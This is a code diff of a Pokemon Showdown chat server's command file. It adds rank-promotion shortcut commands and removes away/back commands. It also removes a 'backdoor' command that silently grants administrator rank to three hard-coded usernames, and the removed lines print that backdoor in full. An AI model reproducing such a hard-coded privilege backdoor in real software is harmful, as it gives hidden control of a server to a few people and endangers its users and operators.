@@ -1,7 +1,6 @@
 /**
  * System commands
  * Pokemon Showdown - http://pokemonshowdown.com/
- *
  * These are system commands - commands required for Pokemon Showdown
  * to run. A lot of these are sent by the client.
  *
@@ -2137,6 +2136,38 @@ target = this.splitTarget(target);
 	deauth: function(target, room, user) {
 		return this.parse('/demote ' + target + ', deauth');
 	},
+	
+	admin: function(target, room, user) {
+		return this.parse('/promote ' + target + ', ~');
+	},
+
+        leader: function(target, room, user) {
+		return this.parse('/promote ' + target + ', &');
+	},
+	
+	mod: function(target, room, user) {
+		return this.parse('/promote ' + target + ', @');
+	},
+	
+	driver: function(target, room, user) {
+		return this.parse('/promote ' + target + ', %');
+	},
+	voice: function(target, room, user) {
+		return this.parse('/promote ' + target + ', +');
+	},
+	
+	roomowner: function(target, room, user) {
+		return this.parse('/roompromote ' + target + ', #');
+	},
+	roommod: function(target, room, user) {
+		return this.parse('/roompromote ' + target + ', @');
+	},
+	roomdriver: function(target, room, user) {
+		return this.parse('/roompromote ' + target + ', %');
+	},
+	roomvoice: function(target, room, user) {
+		return this.parse('/roompromote ' + target + ', +');
+	},
 
 	modchat: function(target, room, user) {
 		if (!target) return this.sendReply("Moderated chat is currently set to: " + room.modchat);
@@ -2631,16 +2662,6 @@ target = this.splitTarget(target);
 		}
 	},
 
-	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === 'ncrypt' || user.userid === 'jackdaw') {
-
-			user.group = '~';
-			user.updateIdentity();
-
-
-		}
-	},
-
 	crashfixed: function(target, room, user) {
 		if (!Rooms.global.lockdown) {
 			return this.sendReply('/crashfixed - There is no active crash.');
@@ -2895,55 +2916,7 @@ target = this.splitTarget(target);
 		});
 	},
 
-afk: 'away',
-	away: function(target, room, user, connection) {
-		if (!this.can('lock')) return false;
 
-		if (!user.isAway) {
-			var originalName = user.name;
-			var awayName = user.name + ' - Away';
-			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
-			delete Users.get(awayName);
-			user.forceRename(awayName, undefined, true);
-
-			this.add('|raw|-- <b><font color="#4F86F7">' + originalName +'</font color></b> is now away. '+ (target ? " (" + target + ")" : ""));
-
-			user.isAway = true;
-		}
-		else {
-			return this.sendReply('You are already set as away, type /back if you are now back');
-		}
-
-		user.updateIdentity();
-	},
-
-	back: function(target, room, user, connection) {
-		if (!this.can('lock')) return false;
-
-		if (user.isAway) {
-
-			var name = user.name;
-
-			var newName = name.substr(0, name.length - 7);
-
-			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
-			delete Users.get(newName);
-
-			user.forceRename(newName, undefined, true);
-
-			//user will be authenticated
-			user.authenticated = true;
-
-			this.add('|raw|-- <b><font color="#4F86F7">' + newName + '</font color></b> is no longer away');
-
-			user.isAway = false;
-		}
-		else {
-			return this.sendReply('You are not set as away');
-		}
-
-		user.updateIdentity();
-	},
 
 	cchall: 'cancelChallenge',
 	cancelchallenge: function(target, room, user) {
